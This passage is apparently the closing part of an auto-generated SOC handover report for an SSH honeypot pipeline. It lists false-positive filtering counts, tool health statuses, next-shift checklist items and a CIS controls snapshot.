| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 4 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 348 cases |
| Tool 34  | Credential Extractor        | ✅ 254 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (7.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 58 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 234 priority case(s) shown individually · 32 recon entry/entries in table (11 group(s) consolidating 66 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-13T09:17:19Z_
